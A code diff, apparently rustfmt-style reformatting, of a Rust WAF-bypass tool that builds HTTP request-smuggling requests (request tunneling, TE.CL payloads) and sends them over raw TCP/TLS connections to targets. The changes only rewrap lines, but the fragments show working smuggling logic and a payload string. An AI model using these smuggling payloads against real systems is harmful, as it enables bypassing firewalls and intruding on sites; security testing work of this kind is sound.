@@ -189,7 +189,10 @@ impl SmugglingBypass {
             smuggling_type: SmugglingType::RequestTunneling,
             method: "POST".to_string(),
             path: path.to_string(),
-            headers: vec![("Content-Length".to_string(), format!("{}", tunnel_body.len()))],
+            headers: vec![(
+                "Content-Length".to_string(),
+                format!("{}", tunnel_body.len()),
+            )],
             body: tunnel_body.as_bytes().to_vec(),
             description: "Request tunneling via body".to_string(),
         });
@@ -342,7 +345,11 @@ impl SmugglingBypass {
             _ => 80,
         });
         let authority = format!("{}:{}", host, port);
-        let stream = timeout(Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS), TcpStream::connect(&authority)).await??;
+        let stream = timeout(
+            Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS),
+            TcpStream::connect(&authority),
+        )
+        .await??;
 
         let mut request_bytes = self.build_raw_request(host, req);
         let mut response = Vec::new();
@@ -351,7 +358,11 @@ impl SmugglingBypass {
                 let mut plain = stream;
                 plain.write_all(&request_bytes).await?;
                 plain.flush().await?;
-                timeout(Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS), plain.read_to_end(&mut response)).await??;
+                timeout(
+                    Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS),
+                    plain.read_to_end(&mut response),
+                )
+                .await??;
             }
             "https" => {
                 let connector = Self::build_tls_connector();
@@ -372,7 +383,11 @@ impl SmugglingBypass {
                 })??;
                 tls.write_all(&request_bytes).await?;
                 tls.flush().await?;
-                timeout(Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS), tls.read_to_end(&mut response)).await??;
+                timeout(
+                    Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS),
+                    tls.read_to_end(&mut response),
+                )
+                .await??;
             }
             other => {
                 return Err(crate::error::SlapperError::Validation(format!(
@@ -479,4 +494,3 @@ pub fn generate_te_cl_payloads() -> Vec<String> {
         "e\r\nGET / HTTP/1.1\r\n\r\n0\r\n\r\n".to_string(),
     ]
 }
-
